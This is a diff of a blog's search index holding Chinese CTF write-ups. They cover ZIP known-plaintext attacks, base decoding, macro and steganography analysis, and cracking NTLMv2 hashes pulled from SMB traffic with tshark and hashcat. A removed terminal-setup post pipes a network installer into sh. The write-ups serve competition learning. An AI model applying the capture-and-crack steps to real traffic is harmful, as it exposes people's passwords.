-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241130183929365.png"
-                        alt="image-20241130183929365"
-                 ></p>
-<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">67f480eff11781617044bd47fb9535cfb0e4b6a09e51daff2107c536e9d4eebb3d517cfea6e3f176d4e0d37a9f3658845f3d1917cfce30a4f44ffa2e0af58485</span><br></pre></td></tr></table></figure>
-<p>看到压缩包内的sha512.txt文件大小也是128，可以猜测这一串文字是sha512.txt的明文，利用这个文件进行明文攻击，新建一个sha512.txt然后压缩查看发现CRC值相同</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241130184527515.png"
-                        alt="image-20241130184527515"
-                 ></p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241130184632294.png"
-                        alt="image-20241130184632294"
-                 ></p>
-<p>按照相同方式压缩后进行明文攻击，使用<code>ARCHPR</code>直接找到密码（也可以使用bkcrak）</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/aff5dc78aed6d788d64e991a460c225.png"
-                        alt="aff5dc78aed6d788d64e991a460c225"
-                 ></p>
-<p>解压后得到flag</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241130184853098.png"
-                        alt="image-20241130184853098"
-                 ></p>
-<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">flag&#123;10e23151aa0da35221a81dff81a53b4e&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="Crypto">Crypto</h2>
-<h3 id="cs">cs</h3>
-<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">截获了一段密文字符串jhjnjcjikmkfjjjkkejkkekdjgjcjnjhjnjcjiko,明文就在其中，请你把它找出来？</span><br></pre></td></tr></table></figure>
-<p>经过尝试，hnci的ascii码减2后为flag，借此猜测j和k是偏移量，可以将这段密文分为两个等长的部分</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jjjjkkjjkjkkjjjjjjjk</span><br><span class="line">hncimfjkekedgcnhncio</span><br></pre></td></tr></table></figure>
-<p>可知偏移量j为2，根据这个爆破偏移量k</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">str1 = <span class="string">&quot;jjjjkkjjkjkkjjjjjjjk&quot;</span></span><br><span class="line">str2 = <span class="string">&quot;hncimfjkekedgcnhncio&quot;</span></span><br><span class="line"></span><br><span class="line">k_range = <span class="built_in">range</span>(-<span class="number">100</span>,<span class="number">100</span>) </span><br><span class="line">results = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> k_range:</span><br><span class="line">    str3 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str1)):</span><br><span class="line">        <span class="keyword">if</span> str1[i] == <span class="string">&quot;j&quot;</span>:</span><br><span class="line">            str3 += <span class="built_in">chr</span>(<span class="built_in">ord</span>(str2[i]) - <span class="number">2</span>) </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            str3 += <span class="built_in">chr</span>(<span class="built_in">ord</span>(str2[i]) + k)</span><br><span class="line">    results.append(<span class="string">f&quot;k=<span class="subst">&#123;k&#125;</span>: <span class="subst">&#123;str3&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> result <span class="keyword">in</span> results:</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
-<p>得到flag</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241130185545848.png"
-                        alt="image-20241130185545848"
-                 ></p>
-<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">flag&#123;thisisrealflag&#125;</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>题解</category>
-      </categories>
-      <tags>
-        <tag>Misc</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>2024 台州市赛 部分WriteUp</title>
     <url>//post/2024tzctf/</url>
     <content><![CDATA[<h2 id="Web">Web</h2>
@@ -719,103 +825,107 @@
       </tags>
   </entry>
   <entry>
-    <title>2024强网拟态Misc方向部分 WriteUp</title>
-    <url>//post/2024qwnt/</url>
-    <content><![CDATA[<p>要我说这个osint真得是神题吧，，社了我一下午加一晚上，直接红温下机（我以后再也不会笑了</p>
-<h3 id="ezflag">ezflag</h3>
-<p>打开流量包，发现直接传输了一个zip压缩包</p>
+    <title>2024 浙江省赛初赛 Misc方向 全WriteUp</title>
+    <url>//post/2024zjctfcs/</url>
+    <content><![CDATA[<h3 id="签到">签到</h3>
+<h4 id="第二题">第二题</h4>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">6L&lt;Ak3,*@VM*&gt;7U&amp;FZFNWc,Ib=t,X!+,BnSDfoaNhdiO*][5F];eV^]Lm&amp;?$&#x27;&lt;oeGH&amp;6tqcgK_JDp-3;8wh?Si,G$BarTFjE?b$eR/,Igij&lt;(&#123;u90M$5If589[&lt;4+jp%3_%R(526#1J|m5p&amp;H+%.#d0&lt;DmLK*#-\8w:xD2Y[3jO&#123;l8[)&lt;(F[=Bcixb&gt;Jp^%L2XvVTzW@9OTko/P74d1sFscEbMO7Vhp&amp;HM;+ww/v[KM1%2M*7O\&#125;rEZM.LM0&#x27;\iwK:])pg-nJef\Rt4</span><br></pre></td></tr></table></figure>
+<p>使用CyberChef：Base92 -&gt; Base85 -&gt; Base64 -&gt; Base62 -&gt; Base58 -&gt; Base45 -&gt; Base32</p>
 <p><img  
                        lazyload
                        alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241020105513319.png"
-                        alt="image-20241020105513319"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ssqd1.png"
+                        alt="1"
                  ></p>
-<p>然后选择 From Hex 然后下载转换后的压缩包即可</p>
-<blockquote>
-<p>Tips: 这里不推荐用CyberChef的magic功能，要不然转出来的压缩包会提示已损坏</p>
-<p>易损坏的压缩包，需要我们自己去修复文件目录区和文件目录结束区</p>
-<p>其实就是多了一位的错误数据</p>
-</blockquote>
-<p>压缩包解压后可以得到一个flag.zip，010查看发现是一张png图片，改后缀为png即可得到flag</p>
+<p>可获得flag</p>
+<h3 id="Misc">Misc</h3>
+<h4 id="RealSignin">RealSignin</h4>
+<p>得到一张png图片，zsteg一下<img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241102162038038.png"
+                        alt=""
+                 ></p>
+<p>文件末尾的是密文，LSB隐写了base表</p>
 <p><img  
                        lazyload
                        alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241020105534102.png"
-                        alt="image-20241020105534102"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241102162238054.png"
+                        alt="image-20241102162238054"
                  ></p>
-<h3 id="PvZ">PvZ</h3>
+<h4 id="机密文档">机密文档</h4>
+<p>下载后发现文件是加密的，经尝试后发现是明文攻击<img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/PixPin_2024-11-02_14-35-03.png"
+                        alt="PixPin_2024-11-02_14-35-03"
+                 ></p>
+<p>如图，使用<code>echo -n &quot;the_secret_you_never_ever_know_hahahaha&quot; &gt; mingwen.txt</code>命令可以将内容写入<code>mingwen.txt</code>，这段明文已经超过8字节，加上已知的<code>50 4B 03 04</code>进行明文攻击，可知偏移量为<code>30</code>，得到如图三段密钥，然后得到密钥后使用三段密钥修改文件密码为<code>111111</code>，然后解压得到一个docm文件，修改后缀为zip后解压，在media文件夹内找到一张图</p>
+<p>打开docm文件可以看到<code>宏已被禁用</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">olevba  the_secret_you_never_ever_know_hahahaha.docm &gt; test.txt</span><br></pre></td></tr></table></figure>
+<p>可以发现一个异或的逻辑</p>
 <p><img  
                        lazyload
                        alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241020105612311.png"
-                        alt="image-20241020105612311"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/PixPin_2024-11-02_14-42-40.png"
+                        alt="PixPin_2024-11-02_14-42-40"
                  ></p>
-<p>提示md5(花费阳光)是解压密码</p>
-<p>我是猜不到了，，写个脚本开爆</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_md5</span>(<span class="params">number</span>):</span><br><span class="line"></span><br><span class="line">    md5_hash = hashlib.md5(<span class="built_in">str</span>(number).encode()).hexdigest()</span><br><span class="line">    <span class="keyword">return</span> md5_hash</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;md5_hashes.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10001</span>):</span><br><span class="line"></span><br><span class="line">        md5_value = generate_md5(i)</span><br><span class="line"></span><br><span class="line">        f.write(<span class="string">f&#x27;<span class="subst">&#123;md5_value&#125;</span>\n&#x27;</span>)  </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;已写入md5_hashes.txt&quot;</span>)</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = [<span class="number">26</span>, <span class="number">25</span>, <span class="number">28</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">1</span>, <span class="number">74</span>, <span class="number">75</span>, <span class="number">45</span>, <span class="number">29</span>, <span class="number">19</span>, <span class="number">49</span>, <span class="number">61</span>, <span class="number">60</span>, <span class="number">3</span>]</span><br><span class="line">key =  <span class="string">&quot;outguess&quot;</span></span><br><span class="line">key_len = <span class="built_in">len</span>(key)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">    tmp = data[i] ^ <span class="built_in">ord</span>(key[(i % key_len)])</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(tmp),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>第47行为异或后的key，用它解media里的图片 outguess隐写即可</p>
+<p>要把后缀名改成jpg</p>
 <p><img  
                        lazyload
                        alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241020105840067.png"
-                        alt="image-20241020105840067"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/PixPin_2024-11-02_14-41-58.png"
+                        alt="PixPin_2024-11-02_14-41-58"
                  ></p>
-<p>二维码修复（最害怕的一集）</p>
+<p>解得flag</p>
 <p><img  
                        lazyload
                        alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241020105852465.png"
-                        alt="image-20241020105852465"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241102164145781.png"
+                        alt="image-20241102164145781"
                  ></p>
+<h4 id="eztraffic">eztraffic</h4>
+<p>打开查看协议分级，发现主要为SMB流量，尝试导出SMB对象，获得<code>final_out.zip</code></p>
 <p><img  
                        lazyload
                        alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241020105904760.png"
-                        alt="image-20241020105904760"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241106204050166.png"
+                        alt="image-20241106204050166"
                  ></p>
-<p>仔细观察左下角，应该不是定位块，猜测二维码被偏移+旋转，修复后得到密文</p>
+<p>打开后看到注释</p>
 <p><img  
                        lazyload
                        alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241020105918057.png"
-                        alt="image-20241020105918057"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241106204141917.png"
+                        alt="image-20241106204141917"
                  ></p>
+<p>猜测是SMB协议传输的NTLM密码+五位数字掩码攻击获得flag，使用tshark导出</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tshark -n -r eztraffic.pcapng -Y <span class="string">&#x27;ntlmssp.messagetype == 0x00000003&#x27;</span> -T fields -e ntlmssp.auth.username -e ntlmssp.auth.domain -e ntlmssp.ntlmv2_response.ntproofstr -e ntlmssp.auth.sesskey -e smb2.sesid</span><br></pre></td></tr></table></figure>
 <p><img  
                        lazyload
                        alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241020105927470.png"
-                        alt="image-20241020105927470"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241106204254865.png"
+                        alt="image-20241106204254865"
                  ></p>
-<blockquote>
-<p>[YG{VDTveRc10qpnJ+<em>)G!~f1{d@-}v&lt;)9xqYonsrqj0hPlkdcb(<code>Hd]#a</code>_A@VzZY;Qu8NMqKPONGkK-,BGF?cCBA@&quot;&gt;76Z:321U54-21</em>Non,+*#G’&amp;%d"y?w_uzsr8vunVrk1ongOe+ihgfeG]#[ZY^W\UZSwWVUNrRQ3IHGLEiCBAFE>=aA:9>765:981Uvu-2+O/.nm+Hi’~}|B&quot;!~}|u]s9qYonsrqj0hmlkjc)gIedcb[!YX]\UZSwWVUN6LpP2HMFEDhHG@dDCBA:^!~&lt;;:921U/u3,+<em>Non&amp;%</em>)('&amp;}C{cy?}|{zs[q7unVl2ponmleMib(fHG]b[Z~k</p>
-</blockquote>
-<p>这个时候回头去看图片的名字：M41b0lg3.png</p>
-<p>把M41b0lg3转换为malbolge，上网一搜发现是一种编程语言，直接在线网站运行即可得到flag</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">username::domain:ServerChallenge:NTproofstring:modifiedntlmv2response</span><br><span class="line">#根据这个格式找到下面的格式然后hashcat爆破</span><br><span class="line">rockyou::MicrosoftAccount:4936df20962cae6d:db12ced50faf52f141636e80205e8f28:01010000000000003604281b951fdb017b4045aa008508eb0000000002001e00440042004500440036004200350041002d0035003100430032002d00340001001e00440042004500440036004200350041002d0035003100430032002d00340004004800640062006500640036006200350061002d0035003100630032002d0034003100650063002d0061006400380034002d0064006400320062003500370030006400350030003900360003004800640062006500640036006200350061002d0035003100630032002d0034003100650063002d0061006400380034002d00640064003200620035003700300064003500300039003600070008003604281b951fdb01060004000200000008003000300000000000000001000000002000008029a5d8256e5c2762f439df5c06f3bc411fb0faeb3a6fa52d9273c57b09f2d10a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e0031002e00380031000000000000000000</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -m 5600 hash.txt rockyou.txt</span><br></pre></td></tr></table></figure>
+<p>得到密码<code>haticehatice</code>，并进行掩码攻击</p>
 <p><img  
                        lazyload
                        alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241020105949204.png"
-                        alt="image-20241020105949204"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241105125829668.png"
+                        alt="image-20241105125829668"
                  ></p>
-<h3 id="Find-way-to-read-video">Find way to read video</h3>
-<p>社工题，每个队伍得到的用户名不一样，所以flag也不一样，综合了几个队伍得到用户名形式是：五个英文+四个数字</p>
-<p>附件解压出来的TXT就以下内容：</p>
-<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">bonan7654 has put his email template on a public platform.</span><br></pre></td></tr></table></figure>
-<p>结果最终在GitCode上，社了一下午+一晚上，，结果这屎题在这种屎平台上</p>
+<p>得到解压密码后获得100张图片，在每张图片的<code>Red 0</code>通道中找到一张隐写的二维码，扫描二维码得到该图片在拼图中的顺序，写脚本完成拼图</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> pyzbar.pyzbar <span class="keyword">import</span> decode</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_lsb</span>(<span class="params">imgname</span>):</span><br><span class="line">    r = []</span><br><span class="line">    img = Image.<span class="built_in">open</span>(imgname)</span><br><span class="line">    width,height = img.size</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">            pixel = img.getpixel((x,y))</span><br><span class="line">            r.append(<span class="built_in">str</span>(pixel[<span class="number">0</span>] &amp; <span class="number">1</span>))</span><br><span class="line">            <span class="comment"># print(pixel)</span></span><br><span class="line">    bin_data = <span class="string">&#x27;&#x27;</span>.join(r)</span><br><span class="line">    <span class="keyword">return</span> bin_data  </span><br><span class="line">            </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bin2img</span>(<span class="params">bin_data</span>):</span><br><span class="line">    imgname = <span class="string">&quot;tmp.png&quot;</span></span><br><span class="line">    pixels = []</span><br><span class="line">    img = Image.new(<span class="string">&quot;RGB&quot;</span>,(<span class="number">50</span>,<span class="number">50</span>))</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> bin_data:</span><br><span class="line">        <span class="keyword">if</span> item ==<span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">            pixels.append((<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            pixels.append((<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line">    img.putdata(pixels)</span><br><span class="line">    <span class="comment"># img.show()</span></span><br><span class="line">    img = img.resize((<span class="number">500</span>,<span class="number">500</span>)) </span><br><span class="line">    <span class="comment"># 这里调整一下图片的大小，便于后面pyzbar的识别</span></span><br><span class="line">    img.save(imgname)</span><br><span class="line">    <span class="keyword">return</span> imgname</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_qrcode</span>(<span class="params">imgname</span>):</span><br><span class="line">    img = Image.<span class="built_in">open</span>(imgname)</span><br><span class="line">    decode_data = decode(img)</span><br><span class="line">    <span class="comment"># print(decode_data)</span></span><br><span class="line">    res = decode_data[<span class="number">0</span>].data.decode()</span><br><span class="line">    os.remove(imgname)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">        </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rename_img</span>():</span><br><span class="line">    filenames = os.listdir(<span class="string">&quot;./final_out&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> filename <span class="keyword">in</span> filenames:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            src_img = <span class="string">&quot;./final_out/&quot;</span>+filename</span><br><span class="line">            bin_data = extract_lsb(src_img)</span><br><span class="line">            imgname = bin2img(bin_data)</span><br><span class="line">            res = read_qrcode(imgname)</span><br><span class="line">            dst_img = <span class="string">f&quot;./final_out/<span class="subst">&#123;res&#125;</span>.png&quot;</span></span><br><span class="line">            os.rename(src_img,dst_img)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] <span class="subst">&#123;src_img&#125;</span> ===&gt; <span class="subst">&#123;dst_img&#125;</span> down!!!&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[-] <span class="subst">&#123;src_img&#125;</span> Error!!!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge_img</span>():</span><br><span class="line">    cols = <span class="number">10</span></span><br><span class="line">    rows = <span class="number">10</span></span><br><span class="line">    img_list = []</span><br><span class="line">    new_img = Image.new(<span class="string">&quot;RGB&quot;</span>,(<span class="number">500</span>,<span class="number">500</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">101</span>):</span><br><span class="line">        img = Image.<span class="built_in">open</span>(<span class="string">f&quot;./final_out/<span class="subst">&#123;i&#125;</span>.png&quot;</span>)</span><br><span class="line">        img_list.append(img)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(rows):</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(cols):</span><br><span class="line">            idx = y * cols + x</span><br><span class="line">            img = img_list[idx]</span><br><span class="line">            x_offset = x * <span class="number">50</span></span><br><span class="line">            y_offset = y * <span class="number">50</span></span><br><span class="line">            new_img.paste(img,(x_offset,y_offset))</span><br><span class="line">            </span><br><span class="line">    <span class="comment"># new_img.show()</span></span><br><span class="line">    new_img.save(<span class="string">&quot;flag.png&quot;</span>)</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># rename_img()</span></span><br><span class="line">    merge_img()</span><br></pre></td></tr></table></figure>
 <p><img  
                        lazyload
                        alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241020112816702.png"
-                        alt="image-20241020112816702"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241105145318142.png"
+                        alt="image-20241105145318142"
                  ></p>
-<p>然后根据<code>垃圾邮箱隐写</code>一类的提示，找到<code>spam</code></p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241020112915512.png"
-                        alt="image-20241020112915512"
-                 ></p>
-<p>联想到<code>spammimic</code>隐写，直接在线网站：</p>
-<p><a class="link"   href="https://www.spammimic.com/decode.cgi" >https://www.spammimic.com/decode.cgi<i class="fas fa-external-link-alt"></i></a></p>
 ]]></content>
       <categories>
         <category>题解</category>
@@ -1071,294 +1181,226 @@ hook密文，发现密文没有改变，那改变的可能是输入的flag数据
       </tags>
   </entry>
   <entry>
-    <title>记录自用的终端美化方案</title>
-    <url>//post/BeautifyBash/</url>
-    <content><![CDATA[<p><s>生产队的驴准备为自己选一个更趁手的磨盘</s>，所谓工作环境当然要赏心悦目才能更高效，下面分享一下自己在用的终端美化方案</p>
-<h2 id="WSL-Ubuntu">WSL-Ubuntu</h2>
-<p>Ubuntu自带的是bash，我认为zsh更加简洁，所以修改终端为zsh后使用oh-my-zsh主题，效果如图<img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/PixPin_2024-10-09_10-25-18.png"
-                        alt="PixPin_2024-10-09_10-25-18"
-                 ></p>
-<h3 id="环境配置">环境配置</h3>
-<h4 id="安装基本工具">安装基本工具</h4>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 更新软件源</span></span><br><span class="line"><span class="built_in">sudo</span> apt update &amp;&amp; <span class="built_in">sudo</span> apt upgrade -y</span><br><span class="line"><span class="comment"># 安装 zsh git curl</span></span><br><span class="line"><span class="built_in">sudo</span> apt install zsh git curl -y</span><br></pre></td></tr></table></figure>
-<p>设置默认终端为 zsh（<strong>注意：不要使用 sudo</strong>）</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chsh -s /bin/zsh</span><br></pre></td></tr></table></figure>
-<h3 id="安装-oh-my-zsh">安装 oh-my-zsh</h3>
-<p>官网：<a class="link"   href="http://ohmyz.sh/%E3%80%82" >http://ohmyz.sh/。<i class="fas fa-external-link-alt"></i></a> 安装方式任选一个即可。</p>
-<table>
-<thead>
-<tr>
-<th style="text-align:left">方法</th>
-<th style="text-align:left">命令</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:left"><strong>curl</strong></td>
-<td style="text-align:left"><code>sh -c &quot;$(curl -fsSL https://install.ohmyz.sh/)&quot;</code></td>
-</tr>
-<tr>
-<td style="text-align:left"><strong>wget</strong></td>
-<td style="text-align:left"><code>sh -c &quot;$(wget -O- https://install.ohmyz.sh/)&quot;</code></td>
-</tr>
-<tr>
-<td style="text-align:left"><strong>fetch</strong></td>
-<td style="text-align:left"><code>sh -c &quot;$(fetch -o - https://install.ohmyz.sh/)&quot;</code></td>
-</tr>
-</tbody>
-</table>
-<p>注意：同意使用 Oh-my-zsh 的配置模板覆盖已有的 <code>.zshrc</code></p>
-<h3 id="配置主题">配置主题</h3>
-<p>下载完想要的主题后，编辑 <code>~/.zshrc</code> 文件，将 <code>ZSH_THEME</code> 设为 <code>你想要的主题</code>。例如<code>lukerandall</code>、<code>robbyrussell</code>。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nano ~/.zshrc</span><br><span class="line"></span><br><span class="line">ZSH_THEME=<span class="string">&quot;你想要的主题&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">source</span> ~/.zshrc</span><br></pre></td></tr></table></figure>
-<p>我使用的是默认主题。故该部分简略带过</p>
-<h3 id="安装插件">安装插件</h3>
-<p><code>oh-my-zsh</code> 已经内置了 <code>git</code> 插件，内置插件可以在 <code>～/.oh-my-zsh/plugins</code> 中查看，下面介绍一下我常用的插件，更多插件可以在 <a class="link"   href="https://github.com/unixorn/awesome-zsh-plugins" >awesome-zsh-plugins<i class="fas fa-external-link-alt"></i></a> 里查看。</p>
-<h4 id="zsh-autosuggestions">zsh -autosuggestions</h4>
-<p><a class="link"   href="https://github.com/zsh-users/zsh-autosuggestions" >zsh-autosuggestions<i class="fas fa-external-link-alt"></i></a> 是一个命令提示插件，当你输入命令时，会自动推测你可能需要输入的命令，按下右键可以快速采用建议。效果如下：</p>
+    <title>DASCTF 2024暑期挑战赛 Misc部分WP</title>
+    <url>//post/DASCTF2407/</url>
+    <content><![CDATA[<h3 id="png-master">png_master</h3>
+<p><a class="link"   href="https://zh.wikipedia.org/wiki/PNG" >PNG文件结构-维基百科<i class="fas fa-external-link-alt"></i></a></p>
+<ul>
+<li><code>IDAT</code>块是储存图像数据的块，在这个块中存放在图像真正的数据信息，IDAT 块只有当上一个块充满（正常length最大65524）时，才会继续一个新的块</li>
+<li>完整的图像数据由一个单独的<code>zlib datastream</code>表示，它储存在一个<code>IDAT</code>块中</li>
+<li>一个png文件中无论有多少个<code>IDAT</code>区块，在<code>IDAT</code>块中只会出现一个<code>zlib</code>块</li>
+<li><code>789C</code>在png文件中为<code>zlib</code>的标志位</li>
+<li>一个<code>zlib</code>数据块只有一个标志位，即只会出现一次<code>789C</code></li>
+</ul>
+<p>flag第一段藏在png文件末尾，base64解码后获得<code>DASCTF&#123;2fd9e9ff-e27</code></p>
 <p><img  
                        lazyload
                        alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241009103559263.png"
-                        alt="image-20241009103559263"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_14-24-09.png"
+                        alt="Clip_2024-07-23_14-24-09"
                  ></p>
-<p>安装方式：把插件下载到本地的 <code>~/.oh-my-zsh/custom/plugins</code> 目录。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-autosuggestions <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;</span>/plugins/zsh-autosuggestions</span><br></pre></td></tr></table></figure>
-<h4 id="zsh-syntax-highlighting">zsh-syntax-highlighting</h4>
-<p><a class="link"   href="https://github.com/zsh-users/zsh-syntax-highlighting" >zsh-syntax-highlighting<i class="fas fa-external-link-alt"></i></a> 是一个命令语法校验插件，在输入命令的过程中，若指令不合法，则指令显示为红色，若指令合法就会显示为绿色。效果如下：</p>
+<p>binwalk和zsteg都会提示png后有额外块，也可以使用<code>pngcheck -v</code>检查每个IDAT块是否有错误</p>
 <p><img  
                        lazyload
                        alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241009103726396.png"
-                        alt="image-20241009103726396"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_14-34-41.png"
+                        alt="Clip_2024-07-23_14-34-41"
                  ></p>
-<p>安装方式：把插件下载到本地的 <code>~/.oh-my-zsh/custom/plugins</code> 目录。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-syntax-highlighting.git <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;</span>/plugins/zsh-syntax-highlighting</span><br></pre></td></tr></table></figure>
-<h4 id="z">z</h4>
-<p><code>oh-my-zsh</code> 内置了 <code>z</code> 插件。<code>z</code> 是一个文件夹快捷跳转插件，对于曾经跳转过的目录，只需要输入最终目标文件夹名称，就可以快速跳转，避免再输入长串路径，提高切换文件夹的效率。</p>
